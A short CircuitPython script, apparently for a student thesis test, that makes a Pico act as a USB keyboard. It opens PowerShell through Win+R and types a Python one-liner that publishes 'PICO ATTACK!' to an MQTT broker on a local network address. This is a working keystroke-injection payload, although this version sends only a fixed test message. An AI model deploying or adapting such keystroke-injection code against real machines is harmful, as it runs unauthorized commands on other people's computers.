import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

time.sleep(5) 

# --- FINAL PAYLOAD (WITH 1-SECOND DELAY) ---

# 1. Open PowerShell
kbd.press(Keycode.GUI, Keycode.R) 
kbd.release_all()
time.sleep(2)
layout.write('powershell\n') 
time.sleep(5)

# 2. Run the Python command with a delay to ensure the message sends
#    (We are also removing the logging to the Desktop, as we don't need it)
layout.write('python -c "import time, paho.mqtt.client as mqtt; client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1); client.connect(\'192.168.0.100\', 1883, 60); client.publish(\'thant-thesis-test/control\', \'PICO ATTACK!\'); time.sleep(1); client.disconnect()"\n')
time.sleep(5)

# 3. Close the terminal
layout.write('exit\n')

# --- END PAYLOAD ---